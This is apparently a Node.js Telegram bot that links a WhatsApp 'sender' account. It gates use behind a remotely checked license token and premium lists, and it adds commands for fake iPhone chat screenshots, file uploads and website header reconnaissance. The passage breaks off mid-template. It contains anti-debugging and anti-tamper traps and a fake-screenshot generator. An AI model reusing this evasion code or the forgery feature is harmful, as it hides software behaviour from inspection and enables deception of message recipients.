const { Telegraf } = require('telegraf');
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const dns = require("dns").promises;
const { URL } = require("url");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require("@whiskeysockets/baileys");
//============( CONST )=======\\
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID, CHANNEL_USERNAME } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const thumbnailUrl = "https://ganga--link--ghhzdp9sv8hk.code.run/i/lpxcso2o";
//============( SAFE SOCK ) =======\\
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
//============( SECURITY ) =======\\
const databaseUrl = `https://raw.githubusercontent.com/Rafijahat13/Scripttoken/refs/heads/main/tokens.json`
function activateSecureMode() {
  secureMode = true;
}

async function loadTokensFromGithub() {
    try {
        const response = await axios.get(databaseUrl, { timeout: 10000 });
        const data = response.data;
        
        if (Array.isArray(data)) return data;
        if (data.tokens && Array.isArray(data.tokens)) return data.tokens;
        if (data.token) return [data.token];
        
        return [];
    } catch (error) {
        console.log(chalk.red('❌ Gagal load token dari GitHub:'), error.message);
        return [];
    }
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.red(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ██████╗ ██╗      ██████╗ ██████╗ ██╗   ██╗
██╔════╝ ██║     ██╔═══██╗██╔══██╗╚██╗ ██╔╝
██║  ███╗██║     ██║   ██║██████╔╝ ╚████╔╝
██║   ██║██║     ██║   ██║██╔══██╗  ╚██╔╝
╚██████╔╝███████╗╚██████╔╝██║  ██║   ██║
 ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝

███████╗██╗  ██╗██╗████████╗██╗   ██╗███████╗
██╔════╝╚██╗██╔╝██║╚══██╔══╝██║   ██║██╔════╝
█████╗   ╚███╔╝ ██║   ██║   ██║   ██║███████╗
██╔══╝   ██╔██╗ ██║   ██║   ██║   ██║╚════██║
███████╗██╔╝ ██╗██║   ██║   ╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝ ╚══════╝
`));
console.log(chalk.bold.yellow(`
» Developer: Rafi
» Version: 4.0.0`))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
  Bypass detected!!
  Your bypass tools are very bad idiot.
  `))
        activateSecureMode();
        hardExit(1);
      }    

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.red(`
⠀⠀Bypass detected!!
  Your bypass tools are very bad idiot.
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);
//============( VALIDATE TOKEN ) =======\\
  async function validateToken() {
    console.log(chalk.blue("🔍 Mengecek token di GitHub..."));

    try {
        const tokens = await loadTokensFromGithub();
        const isValid = tokens.includes(tokenBot);

        if (!isValid) {
            console.log(chalk.red(`
𝙳𝙴𝚅𝙾𝚄𝚁𝙸𝙽𝙶 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 [ 𖣂 ]
❌ Your Bot Token Is Not Registered
— Please Contact The Owner
— @R4f14ndr4 ( Telegram )`
            ));
            process.stdin.pause();
            process.exitCode = 0;
            process.exit(0);
        }

        console.log(chalk.green("✅ Token Valid"));
        console.log(chalk.green("✅ Successfully Connected"));

        startBot();

        setInterval(async () => {
            try {
                const recheckTokens = await loadTokensFromGithub();
                if (!recheckTokens.includes(tokenBot)) {
                    console.log(chalk.red(`
                    𝙳𝙴𝚅𝙾𝚄𝚁𝙸𝙽𝙶 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 [ 𖣂 ]
                    ❌ Your Bot Token Is Not Registered
                    — Please Contact The Owner
                    — @R4f14ndr4 ( Telegram )`
                    ));
                    process.exit(1);
                }
            } catch (err) {
                console.log(chalk.red("❌ Error recheck token:"), err.message);
            }
        }, 10000);

    } catch (err) {
        console.log(chalk.red("❌ Gagal validasi token:"), err.message);
        process.exit(1);
    }
}

function startBot() {
    console.log(chalk.cyan(`
✅ Bot Started!
    `));
}
validateToken();
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

//============( FEATURE ) =======\\
const bot = new Telegraf(tokenBot);

bot.use((ctx, next) => {
  if (secureMode) return;  
  return next();
});
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}
//============( CONNECT ) =======\\
const startSesi = async () => {
console.clear();
  console.log(chalk.bold.red(`
⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀
⣼⣿⣿⣿⢿⣿⣟⣿⣿⣻⣿⣟⡿⠿⢯⡿⠿⢿⣽⣿⣿⣻⣿⢿⣻⣿⣿⢿⣿⣧
⣿⣿⡿⣿⣿⣿⣻⣿⠿⠛⠉⠀⠀⢀⣴⣷⣀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣻⣿⣿⣿
⣿⣿⣿⣿⣿⣽⠟⠁⠀⠀⠀⢀⣴⣿⣿⣿⠟⠁⠀⡀⠀⠀⠈⠻⣿⣽⣿⡿⣟⣿
⣿⣿⡿⣷⣿⠃⠀⠀⠀⢀⣴⣿⣿⣿⠟⠁⠀⠀⣠⣷⣄⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠀⡀⠀⠘⢿⣿⣿⣿⣅⠀⠀⣠⣾⣿⣿⣿⣷⣄⠀⠀⠘⣿⣷⣿⣿
⣿⣿⣽⡟⠀⢠⣧⡀⠀⠀⠙⢿⣿⣿⣷⣾⣿⣿⡿⠻⣿⣿⣿⣷⣄⠀⢹⣿⣿⣻
⣿⣿⣿⡇⠰⣿⣿⣿⣦⡀⠀⠀⣹⣿⣿⣿⣿⣏⠀⠀⠈⠻⣿⣿⣿⡗⢸⣿⣿⣿
⣿⣿⣾⣧⠀⠈⢻⣿⣿⣿⣦⣾⣿⣿⡿⢿⣿⣿⣷⣄⠀⠀⠈⠻⠃⠀⣸⣿⣿⣽
⣿⣿⡿⣿⡄⠀⠀⠈⢻⣿⣿⣿⡿⠋⠀⠀⢙⣿⣿⣿⣷⡄⠀⠀⠀⢠⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡄⠀⠀⠀⠈⠿⠋⠀⠀⢀⣴⣿⣿⣿⠿⠃⠀⠀⠀⢠⣿⣿⣿⣟⣿
⣿⣿⣿⣾⣿⣿⣦⡀⠀⠀⠀⠀⠀⣴⣿⣿⣿⡟⠋⠀⠀⠀⢀⣴⣿⣿⣿⡿⣿⣿
⣿⣿⣟⣿⣷⣿⣿⣿⣷⣤⣀⠀⠀⠈⠻⡟⠋⠀⠀⣀⣤⣾⣿⣿⣿⣿⡿⣿⣿⣿
⢻⣿⣿⢿⣻⣿⣯⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣻⣷⣿⣿⣟⡏
⠀⠙⠿⢿⣿⡿⣿⣿⣷⣿⢿⣿⢿⣿⡿⣿⣿⡿⣿⣿⣟⣯⣷⣿⣿⣿⣻⠯⠋⠀
`));
console.log(chalk.bold.yellow(`
» Developer: Rafi
» Version: 4.0.0`))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Evox',
        }),
    };
    
    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `\`\`\`js
PROSES PAIRING
☐ Number: ${lastPairingMessage.phoneNumber}
☐ Pairing Code: ${lastPairingMessage.pairingCode}
☐ Type: Connected
\`\`\``;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`Sender Connected`))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();
//============( CHECK ) =======\\

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};



//============( COMMAND FEATURE ) =======\\
bot.command("addsender", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addsender 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

      const code = await sock.requestPairingCode(phoneNumber, "RAFI1234");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`js
PROSES PAIRING
☐ Number: ${phoneNumber}
☐ Pairing Code: ${formattedCode}
☐ Type: Not Connected
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`js
PROSES PAIRING
☐ Number: ${lastPairingMessage.phoneNumber}
☐ Pairing Code: ${lastPairingMessage.pairingCode}
☐ Type: Connected
\`\`\``;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('delpremgrup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        return ctx.reply("🪧 ☇ Command ini hanya bisa dipakai di dalam grup");
    }

    const chatId = ctx.chat.id.toString();
    const members = groupMembers.get(chatId);

    if (!members || members.size === 0) {
        return ctx.reply("🪧 ☇ Belum ada data member yang tercatat di grup ini");
    }

    let count = 0;
    for (const userId of members) {
        removePremiumUser(userId);
        count++;
    }

    ctx.reply(`✅ ☇ Premium berhasil dihapus dari ${count} member grup ini`);
});

// Simpan daftar member per grup: { chatId: Set(userId) }
const groupMembers = new Map();

bot.use(async (ctx, next) => {
    if ((ctx.chat?.type === 'group' || ctx.chat?.type === 'supergroup') && ctx.from && !ctx.from.is_bot) {
        const chatId = ctx.chat.id.toString();
        if (!groupMembers.has(chatId)) {
            groupMembers.set(chatId, new Set());
        }
        groupMembers.get(chatId).add(ctx.from.id.toString());
    }
    return next();
});

bot.command('addpremgrup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        return ctx.reply("🪧 ☇ Command ini hanya bisa dipakai di dalam grup");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addpremgrup 30");
    }

    const duration = parseInt(args[1]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const chatId = ctx.chat.id.toString();
    const members = groupMembers.get(chatId);

    if (!members || members.size === 0) {
        return ctx.reply("🪧 ☇ Belum ada data member yang tercatat di grup ini. Member perlu kirim pesan dulu supaya bot mencatatnya.");
    }

    let count = 0;
    let expiryDate;
    for (const userId of members) {
        expiryDate = addPremiumUser(userId, duration);
        count++;
    }

    ctx.reply(`✅ ☇ Premium berhasil diberikan ke ${count} member grup ini sampai ${expiryDate}`);
});

bot.command("iqc", checkPremium, async (ctx) => {
                const chatId = ctx.chat.id;
                const userId = ctx.from.id.toString();
                const args = ctx.message.text.split(" ");

               
                const fullText = ctx.message.text.replace(/^\/iqc\s+/i, "");
                const [input, batteryInput] = fullText.split(",").map(s => s?.trim());

                if (!input || !batteryInput) {  
                        return ctx.reply(  
                                "❌ Incorrect format.\n\nExample:\n/iqc Deryanthetalent,188",  
                                { parse_mode: "Markdown" }  
                        );  
                }  

                const battery = parseInt(batteryInput);
                if (isNaN(battery) || battery < 0 || battery > 100) {
                        return ctx.reply("❌ Battery must be a number between 0–100.", { parse_mode: "Markdown" });
                }

                const hours = Math.floor(Math.random() * 24).toString().padStart(2, '0');  
                const minutes = Math.floor(Math.random() * 60).toString().padStart(2, '0');  
                const time = `${hours}:${minutes}`;  
                  
                const carriers = ["TELKOMSEL", "INDOSAT OOREDOO", "XL AXIATA", "SMARTFREN", "IM3 (THREE)", "BY.U"];  
                const carrier = carriers[Math.floor(Math.random() * carriers.length)];  
                const signalStrength = Math.floor(Math.random() * 4) + 1;  

                const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(input)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=${signalStrength}&emojiStyle=apple`;  

                try {  
                        await ctx.replyWithChatAction("upload_photo");  

                        const response = await axios.get(apiUrl, { responseType: "arraybuffer" });    
                        const buffer = Buffer.from(response.data, "binary");    

                        await ctx.replyWithPhoto(  
                                { source: buffer },  
                                {  
                                        caption: `-# *iPhone Quoted Generator*\n\n💬 ${input}\n🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,  
                                        parse_mode: "Markdown",  
                                        reply_markup: {  
                                                inline_keyboard: [  
                                                        [{ text: "Tokisaki", url: "https://t.me/Testimonideryan" }]  
                                                ]  
                                        }  
                                }  
                        );  
                } catch (err) {  
                        console.error(err.message);  
                        ctx.reply("❌ Terjadi kesalahan saat memproses gambar.");  
                }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});


let blockedCommands = [];

const getBlocked = () => blockedCommands;

// PERINTAH UTAMA /BLOCKCMD
bot.command("command", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  
  const args = ctx.message.text.trim().split(" ").slice(1);
  const aksi = args[0]?.toLowerCase();
  const target = args[1]?.toLowerCase();

  if (!aksi) return ctx.reply(`🪧 ☇ Cara Pakai:
/command block <perintah> → Blokir
/command unblock <perintah> → Buka blokir
/command list → Lihat daftar`);

  // Tambah blokir
  if (aksi === "block") {
    if (!target) return ctx.reply("⛔ Masukkan nama perintah yang mau diblok!");
    if (blockedCommands.includes(target)) return ctx.reply(`⛔ /${target} sudah diblokir!`);
    blockedCommands.push(target);
    return ctx.reply(`✅ Berhasil blokir /${target}!`);
  }

  // Buka blokir
  if (aksi === "unblock") {
    if (!target) return ctx.reply("⛔ Masukkan nama perintah yang mau dibuka!");
    if (!blockedCommands.includes(target)) return ctx.reply(`⛔ /${target} tidak ada di daftar blokir!`);
    blockedCommands = blockedCommands.filter(c => c !== target);
    return ctx.reply(`✅ Berhasil buka blokir /${target}!`);
  }

  // Lihat daftar
  if (aksi === "list") {
    return ctx.reply(`📋 Daftar Perintah Diblokir:
${blockedCommands.length ? blockedCommands.map(c => `• /${c}`).join("\n") : "Tidak ada perintah yang diblokir"}`);
  }
});

// PERINTAH TAMBAHAN /UNBLOCKCMD
bot.command("unblockcmd", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  
  const target = ctx.message.text.split(" ")[1]?.toLowerCase();
  if (!target) return ctx.reply("🪧 ☇ Format: /unblockcmd <namaperintah>");
  if (!blockedCommands.includes(target)) return ctx.reply(`⛔ /${target} tidak diblokir!`);
  blockedCommands = blockedCommands.filter(c => c !== target);
  return ctx.reply(`✅ /${target} sudah dibuka!`);
});


// ===== /cekfunc =====
bot.command("cekfunc", async (ctx) => {
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text) {
    return ctx.reply(
      "❌ Cara pakai:\nReply kode JS lalu ketik:\n/cekfunc"
    );
  }

  const code = ctx.message.reply_to_message.text;

  // Bungkus biar async aman
  const wrappedCode = `
    (async () => {
      ${code}
    })();
  `;

  try {
    // SYNTAX CHECK ONLY
    new vm.Script(wrappedCode);

    // SUCCESS RESPONSE
    const successMsg = `\`\`\`js
🟢 <b>SYNTAX CHECK: PASSED</b>

✅ <b>Status:</b> Aman, tidak ditemukan error syntax
🧠 <b>Parser:</b> Node.js V8 Engine
📦 <b>Mode:</b> Async Function Wrapper
🔐 <b>Execution:</b> Diblokir (Syntax-only)

📊 <b>Analisis Singkat:</b>
• Struktur kode valid
• Kurung & scope seimbang
• Keyword JavaScript dikenali
• Siap dieksekusi tanpa crash syntax

🚀 <b>Kesimpulan:</b>
Kode lu <i>clean</i>, <i>aman</i>, dan <i>lanjut ke tahap logic</i>.
Gagah Si Eta, developer 😎🔥
\`\`\``;

    return ctx.reply(successMsg, { parse_mode: "Markdown" });

  } catch (err) {
    // ERROR RESPONSE
    const errorMsg = `\`\`\`js
🔴 <b>SYNTAX ERROR DETECTED</b>

❌ <b>Status:</b> Gagal parse kode
🧠 <b>Engine:</b> Node.js V8
📍 <b>Error Type:</b> ${err.name}

🧾 <b>Detail Pesan:</b>
<pre>${err.message}</pre>

🛠️ <b>Kemungkinan Penyebab:</b>
• Kurung <code>() {} []</code> tidak seimbang
• Salah penempatan <code>async / await</code>
• Typo keyword JavaScript
• Karakter ilegal / tidak tertutup

📌 <b>Saran:</b>
Periksa baris terakhir yang kamu edit, biasanya error muncul dari sana.
Perbaiki dulu, lalu jalankan <code>/cekfunc</code> ulang.

💀 <i>Fix it, then we talk again.</i>
\`\`\``;

    return ctx.reply(errorMsg, { parse_mode: "Markdown" });
  }
});

bot.command("trackweb", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1).join(" ");
  const replyId = ctx.message.message_id;

  if (!input) {
    return ctx.reply(
      "⚠️ *Masukan URL website*\n\nContoh:\n`/trackweb https://example.com`",
      { reply_to_message_id: replyId, parse_mode: "Markdown" }
    );
  }

  let url;
  try {
    url = input.startsWith("http") ? new URL(input) : new URL("https://" + input);
  } catch {
    return ctx.reply("❌ URL tidak valid.", { reply_to_message_id: replyId });
  }

  const domain = url.hostname;

  try {
    const dnsResult = await dns.lookup(domain);
    const res = await axios.get(url.href, {
      timeout: 10000,
      validateStatus: () => true
    });

    const headers = res.headers;
    const server = headers["server"] || "Unknown";
    const powered = headers["x-powered-by"] || "-";
    const cloudflare = headers["cf-ray"] ? "Yes" : "No";

    const ssl = url.protocol === "https:" ? "Enabled" : "Disabled";

    const output = `\`\`\`js
🔍 *WEB TRACK RESULT*

🌐 *Domain*
${domain}

📡 *Network*
IP       : ${dnsResult.address}
Family   : IPv${dnsResult.family}

🖥 *Server*
WebSrv   : ${server}
Powered  : ${powered}
CloudFlr : ${cloudflare}

🔐 *Security*
HTTPS    : ${ssl}
Status   : ${res.status}

🧩 *Headers*
CSP      : ${headers["content-security-policy"] ? "Yes" : "No"}
HSTS     : ${headers["strict-transport-security"] ? "Yes" : "No"}
